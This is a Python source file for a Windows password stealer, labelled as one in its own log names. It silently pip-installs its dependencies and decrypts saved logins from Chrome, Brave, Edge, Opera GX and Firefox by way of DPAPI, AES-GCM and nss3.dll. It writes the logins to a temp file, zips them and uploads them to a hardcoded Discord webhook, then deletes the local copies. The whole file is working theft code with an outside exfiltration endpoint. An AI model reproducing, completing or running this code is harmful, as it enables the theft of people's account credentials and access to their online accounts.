import os
import json
import base64
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import zipfile
import ctypes
import ctypes.wintypes
import traceback

def install_modules():
    """Check and install required modules, log to file."""
    log_file = os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt')
    required_modules = ['requests', 'psutil', 'pycryptodome', 'opencv-python', 'pywin32']
    
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f"[*] Checking modules at {os.path.join(os.environ.get('APPDATA', ''), 'stealer_log.txt')}\n")
        for module in required_modules:
            try:
                __import__(module)
                f.write(f"[+] {module} is already installed.\n")
            except ImportError:
                f.write(f"[-] {module} not found. Installing...\n")
                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', module, '--no-cache-dir'])
                    f.write(f"[+] {module} installed successfully.\n")
                except subprocess.CalledProcessError as e:
                    f.write(f"[-] Failed to install {module}: {e}\n")
                    sys.exit(1)
    
    # Verify pycryptodome specifically
    try:
        import Cryptodome
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"[+] Cryptodome module found at: {Cryptodome.__file__}\n")
    except ImportError:
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write("[-] Cryptodome import failed after installation.\n")
            f.write(f"[-] sys.executable: {sys.executable}\n")
            f.write(f"[-] sys.path: {sys.path}\n")
            sys.exit(1)

# Install modules before importing Cryptodome
install_modules()

# Import Cryptodome and requests
try:
    from Cryptodome.Cipher import AES
    import requests
except ImportError as e:
    with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
        f.write(f"[-] Import failed: {e}\n")
    sys.exit(1)

def get_master_key(browser_path):
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], browser_path, 'User Data', 'Local State')
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
    except Exception:
        return None

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]

    p_data_in = DATA_BLOB(len(encrypted_key))
    p_data_in.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_key), ctypes.POINTER(ctypes.c_byte))
    p_data_in.cbData = len(encrypted_key)

    p_data_out = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_data_in), None, None, None, None, 0, ctypes.byref(p_data_out)):
        buffer = ctypes.string_at(p_data_out.pbData, p_data_out.cbData)
        ctypes.windll.kernel32.LocalFree(p_data_out.pbData)
        return buffer
    return None

def decrypt_password(encrypted_password, master_key):
    try:
        if isinstance(encrypted_password, memoryview):
            encrypted_password = encrypted_password.tobytes()

        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            decrypted_pass = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted_pass.decode()
        else:
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]

            p_data_in = DATA_BLOB(len(encrypted_password))
            p_data_in.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_password), ctypes.POINTER(ctypes.c_byte))
            p_data_in.cbData = len(encrypted_password)

            p_data_out = DATA_BLOB()
            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_data_in), None, None, None, None, 0, ctypes.byref(p_data_out)):
                buffer = ctypes.string_at(p_data_out.pbData, p_data_out.cbData)
                ctypes.windll.kernel32.LocalFree(p_data_out.pbData)
                return buffer.decode()
    except Exception as e:
        return f"[Decryption failed: {e}]"
    return "[Unknown decryption failure]"

def extract_chromium_passwords(browser_path, browser_name):
    full_browser_path = os.path.join(os.environ['LOCALAPPDATA'], browser_path)
    if not os.path.exists(full_browser_path):
        with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
            f.write(f"[-] {browser_name} not installed. Skipping.\n")
        return []

    master_key = get_master_key(browser_path)
    if not master_key:
        return []

    user_data_dir = os.path.join(full_browser_path, 'User Data')
    if not os.path.exists(user_data_dir):
        return []

    passwords = []

    for folder in os.listdir(user_data_dir):
        full_path = os.path.join(user_data_dir, folder)
        if os.path.isdir(full_path) and (folder.startswith('Default') or folder.startswith('Profile')):
            login_db_path = os.path.join(full_path, 'Login Data')
            if os.path.exists(login_db_path):
                temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_LoginDataCopy.db")
                shutil.copy2(login_db_path, temp_db)

                try:
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        decrypted_password = decrypt_password(encrypted_password, master_key)
                        passwords.append((f"[{browser_name}] {url}", username, decrypted_password))
                    cursor.close()
                    conn.close()
                except Exception as e:
                    with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
                        f.write(f"[-] Error reading {browser_name} database: {e}\n")
                finally:
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
    return passwords

def extract_firefox_passwords_nss():
    from ctypes import CDLL, Structure, POINTER, c_void_p, c_uint, byref, cast, create_string_buffer, string_at

    firefox_dir = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(firefox_dir):
        with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
            f.write("[-] Firefox not installed. Skipping.\n")
        return []

    nss_path = None
    for path in [
        r"C:\Program Files\Mozilla Firefox\nss3.dll",
        r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll"
    ]:
        if os.path.exists(path):
            nss_path = path
            break

    if not nss_path:
        with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
            f.write("[-] nss3.dll not found. Cannot decrypt Firefox passwords.\n")
        return []

    nss = CDLL(nss_path)

    class SECItem(Structure):
        _fields_ = [("type", c_uint), ("data", c_void_p), ("len", c_uint)]

    PK11SDR_Decrypt = nss.PK11SDR_Decrypt
    PK11SDR_Decrypt.argtypes = [POINTER(SECItem), POINTER(SECItem), c_void_p]

    passwords = []

    for profile in os.listdir(firefox_dir):
        profile_path = os.path.join(firefox_dir, profile)
        logins_path = os.path.join(profile_path, 'logins.json')
        if not os.path.exists(logins_path):
            continue

        try:
            if nss.NSS_Init(profile_path.encode('utf-8')) != 0:
                with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
                    f.write(f"[-] NSS init failed for {profile_path}\n")
                continue

            with open(logins_path, 'r', encoding='utf-8') as f:
                logins = json.load(f)

            for login in logins.get('logins', []):
                hostname = login.get('hostname')
                enc_username = base64.b64decode(login.get('encryptedUsername'))
                enc_password = base64.b64decode(login.get('encryptedPassword'))

                def decrypt(enc_data):
                    encrypted = SECItem(0, cast(create_string_buffer(enc_data), c_void_p), len(enc_data))
                    decrypted = SECItem()
                    if PK11SDR_Decrypt(byref(encrypted), byref(decrypted), None) == 0:
                        return string_at(decrypted.data, decrypted.len).decode()
                    return "[Decryption failed]"

                username = decrypt(enc_username)
                password = decrypt(enc_password)
                passwords.append((f"[Firefox] {hostname}", username, password))

            nss.NSS_Shutdown()
        except Exception as e:
            with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
                f.write(f"[-] Error extracting Firefox passwords: {e}\n")
                traceback.print_exc(file=f)

    return passwords

def save_passwords_to_file(passwords, filepath):
    with open(filepath, 'w', encoding='utf-8') as f:
        for url, user, pwd in passwords:
            f.write(f"URL: {url}\nUser: {user}\nPassword: {pwd}\n{'-'*40}\n")

def zip_and_send(filepath, webhook_url):
    zip_path = filepath + '.zip'
    with zipfile.ZipFile(zip_path, 'w') as zipfile:
        zipfile.write(filepath, arcname=os.path.basename(filepath))
    with open(zip_path, 'rb') as f:
        files = {'file': (os.path.basename(zip_path), f)}
        response = requests.post(webhook_url, files=files)
        return response.status_code == 200

def main():
    log_file = os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt')
    try:
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write("[*] Extracting passwords...\n")
        all_passwords = []

        all_passwords.extend(extract_chromium_passwords("Google\\Chrome", "Chrome"))
        all_passwords.extend(extract_chromium_passwords("BraveSoftware\\Brave-Browser", "Brave"))
        all_passwords.extend(extract_chromium_passwords("Microsoft\\Edge", "Edge"))
        all_passwords.extend(extract_chromium_passwords("Opera Software\\Opera GX Stable", "Opera GX"))
        all_passwords.extend(extract_firefox_passwords_nss())

        if not all_passwords:
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write("[-] No passwords found.\n")
            return

        output_file = os.path.join(tempfile.gettempdir(), 'all_passwords.txt')
        save_passwords_to_file(all_passwords, output_file)
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"[+] Passwords saved to: {output_file}\n")

        webhook_url = "https://discord.com/api/webhooks/1408074946823061584/5-TtHlkjiJXt0ggykFuoiJ_g87B319KIvEw_PLYTTFn1C6MLdOgJ0kVeWYF-X2Oshpr8"
        if zip_and_send(output_file, webhook_url):
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write("[+] Data sent successfully.\n")
            os.remove(output_file)
            zip_path = output_file + '.zip'
            if os.path.exists(zip_path):
                os.remove(zip_path)
        else:
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write("[-] Failed to send data.\n")

    except Exception as e:
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"[-] Error: {e}\n")
            traceback.print_exc(file=f)

if __name__ == "__main__":
    main()